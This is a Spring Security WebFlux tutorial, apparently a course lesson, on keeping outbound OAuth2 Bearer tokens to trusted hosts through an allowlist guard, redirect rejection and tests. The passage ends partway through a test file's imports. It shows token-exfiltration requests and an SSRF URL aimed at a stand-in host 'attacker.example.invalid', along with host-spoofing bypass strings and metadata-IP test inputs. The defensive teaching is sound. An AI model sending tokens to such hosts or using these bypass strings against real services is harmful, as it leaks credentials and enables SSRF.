# Restricting Target Hosts to Prevent Sending Bearer Tokens to the Wrong Service

## 1. Objectives and Security Scenario

In **Spring Security Reactive (WebFlux)**, an application can use OAuth2 Client to acquire an access token and call a Resource Server via `WebClient`. Spring Security provides `ServerOAuth2AuthorizedClientExchangeFilterFunction` to attach tokens to outbound requests:

```http
GET /v1/invoices/42 HTTP/1.1
Host: api.billing.example.invalid
Authorization: Bearer <access-token>
```

If that same client calls an unexpected host—for instance due to a user-supplied URL, overly broad default token attachment, or uncontrolled redirects—that header can reach **a service not authorized to receive the token**:

```http
GET /collect HTTP/1.1
Host: attacker.example.invalid
Authorization: Bearer <access-token>
```

Both HTTP snippets merely illustrate the risk; bracketed values are not real credentials. With a Bearer token, anyone holding the token can present it to a Resource Server within the token's granted scope. Therefore, sending a token to the wrong destination is a security incident even if the HTTP response is 404 or 500.

**Lesson:** Restricting target hosts to prevent sending Bearer tokens to the wrong service.  
**Context:** OAuth2 Client.  
**Module:** Spring Security - reactive.  
**Practice environment:** Java 17+, Spring Boot 3.5.x, Spring Security 6.5.x, Reactor Netty.

After this lesson, you will be able to:

1. Explain why an access token should reach only its **intended Resource Server**, never forwarded blindly to other APIs.
2. Distinguish `ClientRegistration`, `OAuth2AuthorizedClient`, `ReactiveOAuth2AuthorizedClientManager`, `ServerOAuth2AuthorizedClientExchangeFilterFunction`, and `WebClient`.
3. Recognize the risks of `setDefaultOAuth2AuthorizedClient(true)`, `setDefaultClientRegistrationId(...)`, `defaultHeader(Authorization, ...)`, and shared `WebClient` beans.
4. Validate the resolved URI using **HTTPS scheme + exact hostname + port + userinfo/fragment checks**, rather than careless `contains`/`endsWith` checks.
5. Place an allowlist guard **before the OAuth2 filter** to reject invalid requests before the manager is even invoked.
6. Understand why `baseUrl` does not lock down absolute URIs, and why automatic redirects can happen beneath the WebClient filter layer.
7. Enable `followRedirect(false)`, reject or strictly control 3xx responses, and never blindly relay `Authorization`.
8. Separate Bearer-authenticated outbound clients from public clients, and expose typed gateway methods taking IDs instead of arbitrary URLs.
9. Understand the limits of hostname policies against DNS rebinding, SSRF, proxies/mTLS, shared hosts, and resource-server audience/scope checks.
10. Test offline with a fake `ReactiveOAuth2AuthorizedClientManager` and fake `ExchangeFunction` to prove tokens attach only when the destination is valid.
11. Add TLS, audience restrictions, least privilege, log redaction, network egress ACLs, and negative tests before production.

The `example.invalid` hostnames are **non-functional example addresses**. The demo application has a working `GET /health` endpoint, and JUnit tests use a fake transport instead of real networking. Calling a real Billing API requires a properly configured Authorization Server/Resource Server issuing real tokens; this lesson never pretends a request with a fake provider can succeed against a live server.

## 2. Bearer Tokens and Authorization Boundaries

### 2.1. An Access Token Is Not a Neutral Header

An OAuth2 Bearer token is typically transmitted as:

```http
Authorization: Bearer eyJ...
```

The access token string may be a JWT or an opaque token. With a bearer token, whoever possesses it can present it; a valid JWT signature does not stop someone else from **replaying the token** if the Resource Server accepts it. Tokens must be kept confidential, sent over TLS, and bounded by lifetime, scope, and audience. Sender-constrained tokens like mTLS/DPoP can reduce replay risk under certain threat models, yet are never an excuse to send tokens to arbitrary hosts.

Per RFC 6750, tokens must be protected from unintended recipients and never placed in URL query strings where browser history, proxy logs, and caches can record them. In outbound HTTP, use the `Authorization` header only with **trusted destinations**.

### 2.2. Target Origin Includes Scheme, Host, and Port

```text
https://api.billing.example.invalid:443/v1/invoices/42?format=json
  |                 |           |       |
  scheme            hostname    port    path + query
```

The practice policy only allows:
- `https` scheme; no `http` or downgrade.
- **Exact** host `api.billing.example.invalid` (no prefix/suffix matching).
- Default HTTPS port or explicit port 443.
- No URI userinfo (such as `user@host`).
- No fragment.
- No automatic following of HTTP redirects elsewhere.
- Explicit `clientRegistrationId("billing-api")` at the call site.

If multiple APIs or tenants share one origin, checking the host alone is **insufficient**: add path/service policies, identity/resource audience, ACLs, and tenant permissions. In production, DNS/IP/egress policies serve as the backstop behind the URL guard.

### 2.3. Additional Layers of Defense

| Layer | Goal | What It Does Not Solve Alone |
|---|---|---|
| ClientRegistration | Selects client, grant type, AS token endpoint, scopes | Does not define which Resource Server hosts may receive the token |
| Authorized Client | Holds `OAuth2AccessToken` and principal/registration | Does not validate the target URL being called |
| Destination allowlist | Blocks invalid scheme/hostname/port | Does not lock down DNS/IP or shared API paths |
| WebClient filter order | Blocks before OAuth2 attaches a token | Does not cover internal redirects in the HTTP transport |
| Redirect policy | Prevents forwarding requests to a new host | Does not stop SSRF on an already-invalid initial URL |
| TLS | Protects transit, verifies certificate and hostname | Does not stop sending tokens to an attacker host with valid TLS |
| Network egress ACL | Blocks connections outside permitted IPs/networks | Does not replace authorization or resource audience checks |
| Token audience | Token is valid only at its intended resource server | Does not stop an attacker from seeing a misrouted token |
| Scopes and TTL | Limits actions and exposure window | Does not fix secret leaks |
| Log redaction | Prevents tokens from entering logs/traces | Does not stop HTTP requests to the wrong destination |

## 3. What Does WebClient OAuth2 Integration Do?

### 3.1. ServerOAuth2AuthorizedClientExchangeFilterFunction

In Spring WebFlux 6.5, Spring Security provides the filter:

```text
org.springframework.security.oauth2.client.web.reactive.function.client
    .ServerOAuth2AuthorizedClientExchangeFilterFunction
```

Standard setup per documentation:

```java
ServerOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
    new ServerOAuth2AuthorizedClientExchangeFilterFunction(
        authorizedClientManager);

WebClient outbound = WebClient.builder()
    .filter(oauth2)
    .build();
```

This is a **snippet** requiring imports and a manager bean. The OAuth2 filter resolves the authorized client, acquires or refreshes the access token via the appropriate manager/provider, and writes it to the HTTP `Authorization` header. It does not decide for you **which hostname is an authorized resource server for that token**.

### 3.2. Selecting an Authorized Client Explicitly

```java
// Service snippet; add matching static import for clientRegistrationId(...).
return billingWebClient.get()
    .uri("/v1/invoices/{id}", invoiceId)
    .attributes(clientRegistrationId("billing-api"))
    .retrieve()
    .bodyToMono(String.class);
```

`clientRegistrationId("billing-api")` specifies the client registration for token selection. It **does not verify that the URI points to the right host**. If code permits absolute URIs or arbitrary URLs, requests can still carry tokens to unauthorized destinations without a guard.

Another API is `oauth2AuthorizedClient(authorizedClient)` to pass an already-authorized object in request attributes. Both forms require a **destination policy**; explicit token selection never makes arbitrary hostnames safe.

### 3.3. Warning on setDefaultOAuth2AuthorizedClient(true)

Leak-prone pattern:

```java
var oauth2 =
    new ServerOAuth2AuthorizedClientExchangeFilterFunction(manager);
oauth2.setDefaultOAuth2AuthorizedClient(true);

WebClient shared = WebClient.builder()
    .filter(oauth2)
    .build();
```

When a user is logged in via `oauth2Login` and an OAuth2 authorized client can be resolved from the current `Authentication`, Spring Security can automatically attach the user's token to **all HTTP requests through this WebClient**. Spring Security 6.5 documentation explicitly advises caution because access tokens could be attached to every request.

If a developer reuses `shared` to call analytics, webhooks, user-input URLs, or unintended metadata endpoints, tokens risk reaching the wrong recipient. **Never enable this default on a general-purpose WebClient.**

### 3.4. Default Registration Does Not Lock Down Hosts Either

```java
oauth2.setDefaultClientRegistrationId("billing-api");
```

This sets a default registration for token selection; it does **not** mean "attach only if Host belongs to Billing API". Spring Security gives the same warning that any outbound request through the filter may receive the token. Select registrations at controlled call sites and enforce destination checks before the OAuth2 filter.

### 3.5. Never Set a Global Authorization Default Header

Flawed design example:

```java
WebClient unsafe = WebClient.builder()
    .defaultHeader("Authorization", "Bearer " + accessToken)
    .build();
```

Every request through that client carries the same static token—even to the wrong host, for another user, or after expiration. Never use `defaultHeader` to relay Bearer tokens; use the OAuth2 manager, call-site registration selection, and destination guards instead.

### 3.6. Client Credentials vs. User Delegation

- `authorization_code` is typically used when a browser user logs in/consents, associating tokens with a resource owner.
- `client_credentials` grants permissions to the **service itself**, carrying no inherent user identity.
- `ReactiveOAuth2AuthorizedClientManager` handles authorize/re-authorize, provider selection, and persistence.
- `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` fits background service-to-service calls lacking an inbound `ServerWebExchange`.
- `DefaultReactiveOAuth2AuthorizedClientManager` is built for `ServerWebExchange` contexts and web flows.
- Never grab a user token from Reactor Context and automatically relay it to every service.
- When an API needs user-level authority, use supported delegation/token exchange with the right scopes and audience.

## 4. Failure Patterns That Send Tokens to the Wrong Service

### 4.1. Caller-Controlled URLs (SSRF)

```text
GET /fetch?url=https://attacker.example.invalid/collect
```

Broken controller:

```java
// Flawed design snippet.
return shared.get()
    .uri(userSuppliedUrl)
    .retrieve()
    .bodyToMono(String.class);
```

If `shared` has an OAuth2 filter attaching Bearer tokens automatically, an attacker can capture the token. This is also **Server-Side Request Forgery** because the backend fetches an externally controlled URL.

Prefer a typed gateway API like `findInvoice(id)` where the destination is **fixed server-side** and only validated identifiers are accepted. If a product genuinely needs dynamic URLs, enforce URL allowlists, DNS/IP validation, egress ACLs, resource limits, redirect blocking, and **never send the `billing-api` token** to non-Billing Resource Servers.

### 4.2. baseUrl Is Not a Security Boundary

```java
WebClient client = WebClient.builder()
    .baseUrl("https://api.billing.example.invalid")
    .build();

// Relative request uses base URL:
client.get().uri("/v1/invoices");

// Absolute URI can override baseUrl:
client.get().uri("https://attacker.example.invalid/collect");
```

This is a snippet. Setting `baseUrl` alone does not guarantee every URI stays on that host. Always inspect **`ClientRequest.url()` after URI resolution**.

### 4.3. Checking URLs with contains/endsWith Is Dangerous

```java
boolean allowed = rawUrl.contains("api.billing.example.invalid");
```

It is easily bypassed by:

```text
https://api.billing.example.invalid.attacker.invalid/
https://attacker.invalid/?continue=api.billing.example.invalid
https://api.billing.example.invalid@attacker.invalid/path
http://api.billing.example.invalid/
https://api.billing.example.invalid:8443/
```

In a URL containing `@`, the left side is **userinfo**, not the target host. Parse with `java.net.URI` and match `getHost()` exactly along with scheme, port, and userinfo. If accepting IDN hostnames, production needs Unicode normalization/punycode and strict rules; this lesson uses fixed ASCII hostnames.

### 4.4. Redirects 301/302/303/307/308

Even a legitimate resource server host could return:

```http
HTTP/1.1 302 Found
Location: https://attacker.example.invalid/collect
```

If the underlying HTTP client auto-follows redirects, a filter inspecting the **initial request** will not necessarily inspect subsequent hops. Never assume every HTTP client or proxy strips `Authorization` identically across cross-origin redirects.

Fail-closed model:

1. `HttpClient.followRedirect(false)`.
2. For outbound APIs carrying Bearer tokens, treat unexpected 3xx responses as errors and do not follow `Location`.
3. If following redirects is genuinely required, enforce a **per-hop allowlist** with an explicit `Authorization` policy; never copy bearer tokens blindly.
4. Reject HTTPS -> HTTP downgrades, unlisted hosts, and alternate ports.
5. Test redirect chains against a real transport/proxy; unit tests mocking `ExchangeFunction` do not cover Netty-level auto-redirects.

### 4.5. Shared Hosts and Wrong Tenants

Suppose one origin hosts multiple services:

```text
https://api.company.invalid/billing/v1/...
https://api.company.invalid/hr/v1/...
```

Matching the host alone does not prove a Billing token may target HR paths. On shared hosts:
- Never accept arbitrary paths from callers.
- Typed gateways should construct only predefined routes.
- If using a custom path guard, **canonicalize** paths and prevent encoded path traversal.
- Tokens should carry the specific resource or tenant `aud` and minimal required scopes.
- The Resource Server must validate issuer, audience, scopes, and ACLs.
- Prefer separate hostnames and service identities across distinct security domains.

Never use naive `startsWith("/billing")` checks, which match `/billing-admin`; if path matching is necessary, enforce normalization and segment boundaries.

## 5. A Safer Architecture

### 5.1. One WebClient per Resource Server

```text
BillingGateway
  |
  +-- billingApi WebClient
        +-- fixed baseUrl
        +-- DestinationGuard HTTPS exact host:443
        +-- OAuth2 filter with explicit clientRegistrationId
        +-- RejectRedirectsFilter
        +-- Reactor Netty followRedirect(false)
        +-- sends Bearer only to Billing Resource Server

PublicCatalogGateway
  |
  +-- publicHttp WebClient
        +-- no OAuth2 filter
        +-- no default Authorization

Authorization Server token endpoint:
  goes through OAuth2AuthorizedClientManager / dedicated token client
  with its own trusted TLS/egress policy
```

Inject the **typed `BillingGateway`** rather than exposing a general-purpose `WebClient` across services. If an Analytics API also needs tokens, create a separate client, registration, and guard—never reuse the Billing token.

### 5.2. The Guard Must Run Before the OAuth2 Filter

```text
WebClient request (resolved URI)
           |
           v
DestinationGuard
  | invalid URI -> Mono.error, never calls manager or HTTP transport
  | valid URI
           v
ServerOAuth2AuthorizedClientExchangeFilterFunction
  -> manager finds or acquires/refreshes token
  -> header Authorization: Bearer ...
           |
           v
RejectRedirectsFilter
           |
           v
HttpClient.followRedirect(false)
           |
           v
Trusted Resource Server
```

Registering filters in this order checks the host before touching any tokens. Never assume `baseUrl` or a default `registrationId` builds an origin guard automatically.

### 5.3. Controlling DNS/IP and Proxies

Hostname checking is only one **layer**; it does not cover:
- DNS rebinding: an allowlisted hostname resolves to private/link-local/loopback IPs or changes between lookups.
- Egress proxies or service meshes rerouting traffic to different endpoints.
- `trustAll` configurations or disabled TLS hostname/certificate checks.
- Shared endpoints multiplexing virtual hosts, tenants, or paths.
- Other HTTP clients (SDKs, `RestClient`, gRPC) bypassing the guarded `WebClient`.
- Background jobs constructing a new `WebClient` without the filters.
- Token leakage through logs, traces, or APM.

Production requires trusted DNS resolvers, egress network controls permitting only approved IPs/services, blocking metadata services and unauthorized private IPs, TLS hostname validation, distinct service identities, and log redaction. Never add arbitrary user-supplied hosts to an allowlist just to make a request pass.

## 6. Token Audience, Scopes, and Damage Containment

### 6.1. Audience Is Not a Hostname Guard

- `scope=invoice.read` limits **actions**.
- `aud=billing-api` limits the **resource server**.
- `iss` identifies the trusted Authorization Server.
- Token TTL limits the token's validity window.
- Host allowlists limit **where the client sends the token**.

Even a properly audience-scoped token can be **stolen** if the client sends it to an attacker. Audience restrictions limit where a token can be **successfully redeemed**, without preventing exposure of the token string. The Resource Server must enforce audience validation rather than checking only the JWT signature.

### 6.2. RFC 8707 Resource Indicators

RFC 8707 defines the `resource` parameter so clients can tell the Authorization Server which resource is intended to receive the token, e.g.:

```text
resource=https://api.billing.example.invalid/
scope=invoice.read
```

The Authorization Server can audience-restrict the issued token to that resource. However, **not all IdPs support RFC 8707**; check provider-specific configuration. Do not append `resource` to Resource Server requests expecting it to alter the token's audience.

### 6.3. When Calling Multiple Downstream Resource Servers

Prefer requesting **separate tokens per audience**:
- billing-api: `aud=billing`, scope `invoice.read`.
- hr-api: `aud=hr`, scope `employee.read`.
- analytics-api: `aud=analytics`, minimal scopes.

Never pass one multi-audience or broad-scope token to all services unless explicitly approved by the architecture and threat model. In multi-tenant environments, token audiences or resource paths may need tenant context so the Resource Server blocks cross-tenant token reuse.

## 7. Spring Boot 3.x + WebFlux + OAuth2 Client Project

### 7.1. Dependencies

Generate a Gradle Groovy project via Spring Initializr with Java 17+, Spring Boot 3.5.x, Spring Reactive Web, Spring Security, OAuth2 Client, and Test.

The `dependencies` block of `build.gradle`:

```groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-webflux'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'

    testImplementation 'org.springframework.boot:spring-boot-starter-test'
    testImplementation 'org.springframework.security:spring-security-test'
    testImplementation 'io.projectreactor:reactor-test'
    testRuntimeOnly 'org.junit.platform:junit-platform-launcher'
}
```

This is the dependencies block, **not the complete `build.gradle`**. Keep the Spring Boot plugin, dependency management, toolchain, repositories, and Gradle wrapper from Initializr. Avoid adding `spring-boot-starter-web` when building a WebFlux app, as MVC takes precedence when both starters are present in Boot 3.x.

Layout:

```text
src/main/java/demo/tokenbound/
  TokenBoundApplication.java
  DestinationGuard.java
  RejectRedirectsFilter.java
  OAuthClientConfig.java
  BillingGateway.java
  HealthController.java
src/test/java/demo/tokenbound/
  DestinationGuardTests.java
  OAuthClientBoundaryTests.java
```

### 7.2. TokenBoundApplication.java

```java
package demo.tokenbound;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class TokenBoundApplication {

    public static void main(String[] args) {
        SpringApplication.run(TokenBoundApplication.class, args);
    }
}
```

### 7.3. DestinationGuard.java

File `src/main/java/demo/tokenbound/DestinationGuard.java`:

```java
package demo.tokenbound;

import java.net.URI;
import java.util.Locale;

import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.ClientResponse;
import org.springframework.web.reactive.function.client.ExchangeFilterFunction;
import org.springframework.web.reactive.function.client.ExchangeFunction;
import reactor.core.publisher.Mono;

public final class DestinationGuard
        implements ExchangeFilterFunction {

    public static final class DestinationRejectedException
            extends IllegalArgumentException {
        public DestinationRejectedException() {
            super("Outbound destination is not allowed");
        }
    }

    private final String trustedHost;

    public DestinationGuard(URI trustedOrigin) {
        if (trustedOrigin == null
                || trustedOrigin.getHost() == null
                || !"https".equalsIgnoreCase(trustedOrigin.getScheme())
                || trustedOrigin.getPort() != -1
                || trustedOrigin.getRawUserInfo() != null
                || trustedOrigin.getRawQuery() != null
                || trustedOrigin.getRawFragment() != null
                || (!"/".equals(trustedOrigin.getPath())
                    && !"".equals(trustedOrigin.getPath()))) {
            throw new IllegalArgumentException(
                "Trusted origin must be a bare HTTPS hostname");
        }
        this.trustedHost = trustedOrigin.getHost()
            .toLowerCase(Locale.ROOT);
    }

    public boolean permitted(URI target) {
        if (target == null || !target.isAbsolute()) {
            return false;
        }
        return "https".equalsIgnoreCase(target.getScheme())
            && target.getHost() != null
            && target.getHost().toLowerCase(Locale.ROOT)
                .equals(this.trustedHost)
            && (target.getPort() == -1 || target.getPort() == 443)
            && target.getRawUserInfo() == null
            && target.getRawFragment() == null;
    }

    @Override
    public Mono<ClientResponse> filter(
            ClientRequest request, ExchangeFunction next) {
        if (!permitted(request.url())) {
            return Mono.error(new DestinationRejectedException());
        }
        return next.exchange(request);
    }
}
```

Annotations:

- `ClientRequest.url()` holds the outbound URI already resolved by `WebClient`. Never match raw URI strings with `contains`.
- Host matches exactly and case-insensitively; port `8443` is rejected.
- `getRawUserInfo() == null` blocks URIs containing `name@host`, including userinfo tricks that mislead reviewers.
- Fragments are unnecessary in HTTP requests and are rejected; queries may carry business parameters, never secrets or tokens.
- When a URL is invalid, the filter emits `Mono.error` **before** calling `next.exchange`.
- Fixed exception message never logs the URI or credentials.
- In production, add IDN/punycode handling, DNS/IP egress policies, and path permissions. This code alone must not be labeled complete SSRF protection.

### 7.4. RejectRedirectsFilter.java

File `src/main/java/demo/tokenbound/RejectRedirectsFilter.java`:

```java
package demo.tokenbound;

import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.ClientResponse;
import org.springframework.web.reactive.function.client.ExchangeFilterFunction;
import org.springframework.web.reactive.function.client.ExchangeFunction;
import reactor.core.publisher.Mono;

public final class RejectRedirectsFilter
        implements ExchangeFilterFunction {

    @Override
    public Mono<ClientResponse> filter(
            ClientRequest request, ExchangeFunction next) {
        return next.exchange(request)
            .flatMap(response -> {
                if (response.statusCode().is3xxRedirection()) {
                    return response.releaseBody()
                        .then(Mono.error(new IllegalStateException(
                            "Unexpected outbound redirect")));
                }
                return Mono.just(response);
            });
    }
}
```

The first lock is transport-level `HttpClient.followRedirect(false)`. The second lock is this filter rejecting 3xx responses and calling `releaseBody()` to free the response body. Even `304 Not Modified` falls in 3xx and is rejected **intentionally in this demo**; if a real product uses conditional GET/caching, handle 304 explicitly rather than treating all 3xx responses uniformly.

### 7.5. OAuthClientConfig.java

File `src/main/java/demo/tokenbound/OAuthClientConfig.java`:

```java
package demo.tokenbound;

import java.net.URI;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.http.client.reactive.ReactorClientHttpConnector;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.oauth2.client.AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.InMemoryReactiveOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistration;
import org.springframework.security.oauth2.client.registration.InMemoryReactiveClientRegistrationRepository;
import org.springframework.security.oauth2.client.registration.ReactiveClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.ClientAuthenticationMethod;
import org.springframework.security.web.server.SecurityWebFilterChain;
import org.springframework.web.reactive.function.client.WebClient;

import reactor.netty.http.client.HttpClient;

@Configuration
public class OAuthClientConfig {

    public static final URI BILLING_ORIGIN =
        URI.create("https://api.billing.example.invalid");

    @Bean
    ReactiveClientRegistrationRepository registrations() {
        ClientRegistration billing =
            ClientRegistration.withRegistrationId("billing-api")
                .clientId("demo-client-not-real")
                .clientSecret("demo-secret-not-real")
                .clientAuthenticationMethod(
                    ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
                .authorizationGrantType(
                    AuthorizationGrantType.CLIENT_CREDENTIALS)
                .tokenUri(
                    "https://auth.billing.example.invalid/oauth/token")
                .scope("invoice.read")
                .clientName("Billing API")
                .build();

        return new InMemoryReactiveClientRegistrationRepository(
            billing);
    }

    @Bean
    ReactiveOAuth2AuthorizedClientService clientService(
            ReactiveClientRegistrationRepository registrations) {
        return new InMemoryReactiveOAuth2AuthorizedClientService(
            registrations);
    }

    @Bean
    ReactiveOAuth2AuthorizedClientManager clientManager(
            ReactiveClientRegistrationRepository registrations,
            ReactiveOAuth2AuthorizedClientService clientService) {
        var provider =
            ReactiveOAuth2AuthorizedClientProviderBuilder.builder()
                .clientCredentials()
                .build();

        var manager =
            new AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager(
                registrations, clientService);
        manager.setAuthorizedClientProvider(provider);
        return manager;
    }

    @Bean("billingApi")
    WebClient billingApi(
            ReactiveOAuth2AuthorizedClientManager manager) {
        var oauth2 =
            new ServerOAuth2AuthorizedClientExchangeFilterFunction(
                manager);

        oauth2.setDefaultOAuth2AuthorizedClient(false);
        // Do not configure setDefaultClientRegistrationId(...).

        HttpClient transport = HttpClient.create()
            .followRedirect(false);

        return WebClient.builder()
            .baseUrl(BILLING_ORIGIN.toString())
            .clientConnector(new ReactorClientHttpConnector(transport))
            .filter(new DestinationGuard(BILLING_ORIGIN))
            .filter(oauth2)
            .filter(new RejectRedirectsFilter())
            .build();
    }

    @Bean("publicHttp")
    WebClient publicHttp() {
        return WebClient.builder()
            .clientConnector(new ReactorClientHttpConnector(
                HttpClient.create().followRedirect(false)))
            .build();
    }

    @Bean
    SecurityWebFilterChain inbound(ServerHttpSecurity http) {
        return http
            .authorizeExchange(exchanges -> exchanges
                .pathMatchers(HttpMethod.GET, "/health").permitAll()
                .anyExchange().denyAll())
            .httpBasic(basic -> basic.disable())
            .formLogin(form -> form.disable())
            .build();
    }
}
```

Analysis:

1. `ReactiveClientRegistrationRepository` defines a registration using `client_credentials` and scope `invoice.read`.
2. `ReactiveOAuth2AuthorizedClientService` holds authorized clients temporarily in memory for the demo.
3. `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` handles service-to-service authorization without needing `ServerWebExchange`, using the `clientCredentials()` provider.
4. The Authorization Server token endpoint is **`https://auth.billing.example.invalid/oauth/token`**, distinct from the Resource Server **`https://api.billing.example.invalid`**. Those two outbound domains have separate trust and egress policies.
5. `billingApi` uses an HTTPS base URL, an origin guard before the OAuth2 filter, rejects 3xx responses, and disables Netty auto-redirects.
6. `setDefaultOAuth2AuthorizedClient(false)` prevents falling back to a user token; **`setDefaultClientRegistrationId` is omitted**.
7. `publicHttp` has no OAuth2 filter and attaches no tokens automatically.
8. Inbound security only allows `GET /health`, exposing no API that accepts arbitrary URLs from browsers.
9. Demo credentials and `.invalid` domains **do not work**. In production, use a secrets manager/env/rotation and authorized endpoints; never commit real credentials to source.

When an application has user browser logins, the manager inside a `ServerWebExchange` context will differ. Do not copy `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` blindly into authorization-code flows without considering application context. Conversely, a cron job without request scope must not rely on `DefaultReactiveOAuth2AuthorizedClientManager`, which expects an exchange context.

### 7.6. BillingGateway.java: Specific Method, Never Accepts URLs

```java
package demo.tokenbound;

import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.reactive.function.client.WebClient;
import reactor.core.publisher.Mono;

import static org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction.clientRegistrationId;

@Service
public class BillingGateway {

    private final WebClient client;

    public BillingGateway(@Qualifier("billingApi") WebClient client) {
        this.client = client;
    }

    public Mono<String> findInvoice(String invoiceId) {
        if (invoiceId == null
                || !invoiceId.matches("[A-Za-z0-9-]{1,64}")) {
            return Mono.error(new IllegalArgumentException(
                "Invalid invoice identifier"));
        }

        return client.get()
            .uri("/v1/invoices/{id}", invoiceId)
            .attributes(clientRegistrationId("billing-api"))
            .retrieve()
            .bodyToMono(String.class);
    }
}
```

Callers pass only a validated invoice ID; the request destination is fixed in configuration. Invoice ID validation does not replace authentication or authorization: the Billing Resource Server must still verify principal, service identity, audience, scopes, and invoice ACLs.

### 7.7. HealthController.java

```java
package demo.tokenbound;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import reactor.core.publisher.Mono;

@RestController
public class HealthController {

    @GetMapping("/health")
    public Mono<String> health() {
        return Mono.just("ok");
    }
}
```

### 7.8. Running the Project

From the Gradle root:

```bash
./gradlew bootRun
```

PowerShell:

```powershell
.\gradlew.bat bootRun
```

Test public health:

```bash
curl -i http://localhost:8080/health
```

Expected response core:

```http
HTTP/1.1 200 OK
Content-Type: text/plain;charset=UTF-8

ok
```

`Content-Type`, charset, header order, and security headers may vary by server/version. The health demo requests no access token and calls no fake IdP. To run `BillingGateway.findInvoice` for real, replace the fake endpoints, client credentials, and network policies and issue a token with the proper audience; there is no safe way to convert fake test Bearer tokens into production tokens.

## 8. Pure URI Allowlist Tests

Create `src/test/java/demo/tokenbound/DestinationGuardTests.java`:

```java
package demo.tokenbound;

import java.net.URI;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class DestinationGuardTests {

    private DestinationGuard guard;

    @BeforeEach
    void setup() {
        guard = new DestinationGuard(
            URI.create("https://api.billing.example.invalid"));
    }

    @Test
    void allowsExactTrustedOrigin() {
        assertTrue(guard.permitted(URI.create(
            "https://api.billing.example.invalid/v1/invoices")));
    }

    @Test
    void allowsExplicitPort443() {
        assertTrue(guard.permitted(URI.create(
            "https://api.billing.example.invalid:443/v1/invoices")));
    }

    @Test
    void rejectsUnrelatedHost() {
        assertFalse(guard.permitted(URI.create(
            "https://attacker.example.invalid/collect")));
    }

    @Test
    void rejectsHostnameSuffixSpoofing() {
        assertFalse(guard.permitted(URI.create(
            "https://api.billing.example.invalid.attacker.invalid/x")));
    }

    @Test
    void rejectsDowngradeToHttp() {
        assertFalse(guard.permitted(URI.create(
            "http://api.billing.example.invalid/v1/invoices")));
    }

    @Test
    void rejectsOtherPort() {
        assertFalse(guard.permitted(URI.create(
            "https://api.billing.example.invalid:8443/")));
    }

    @Test
    void rejectsUserInfo() {
        assertFalse(guard.permitted(URI.create(
            "https://user@api.billing.example.invalid/x")));
    }

    @Test
    void rejectsIpLiteral() {
        assertFalse(guard.permitted(URI.create(
            "https://127.0.0.1/metadata")));
        assertFalse(guard.permitted(URI.create(
            "https://[::1]/metadata")));
    }

    @Test
    void rejectsFragmentAndRelativeTarget() {
        assertFalse(guard.permitted(URI.create(
            "https://api.billing.example.invalid/x#fragment")));
        assertFalse(guard.permitted(URI.create("/v1/invoices")));
    }

    @Test
    void constructorRejectsInsecureTrustedOrigin() {
        assertThrows(IllegalArgumentException.class, () ->
            new DestinationGuard(
                URI.create("http://api.billing.example.invalid")));
    }
}
```

**10 unit test methods** evaluate the URI policy with no network calls and no tokens. Production tests should expand to cover IPv4/IPv6 distinction, IDN/punycode, DNS rebinding, proxy routing, URL canonicalization, and path segmentation when a host serves multiple APIs.

## 9. Tests for OAuth2 Filter + Fake Manager + Fake HTTP Transport

The goal of this test group is to prove Spring Security's **real filter** attaches the Bearer token only when the URI is permitted. We use:

- A fake `ReactiveOAuth2AuthorizedClientManager` returning an `OAuth2AuthorizedClient` with a token meaningless outside unit tests.
- A fake `ExchangeFunction` capturing the final request and counting invocations without opening sockets.
- `DestinationGuard` positioned before the OAuth2 filter.
- `RejectRedirectsFilter` rejecting 3xx responses.
- `StepVerifier` asserting signals from the reactive pipeline.

File `src/test/java/demo/tokenbound/OAuthClientBoundaryTests.java`:

```java
package demo.tokenbound;

import java.net.URI;
import java.time.Instant;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.context.ReactiveSecurityContextHolder;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.registration.ClientRegistration;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.ClientAuthenticationMethod;
import org.springframework.security.oauth2.core.OAuth2AccessToken;
import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.ClientResponse;
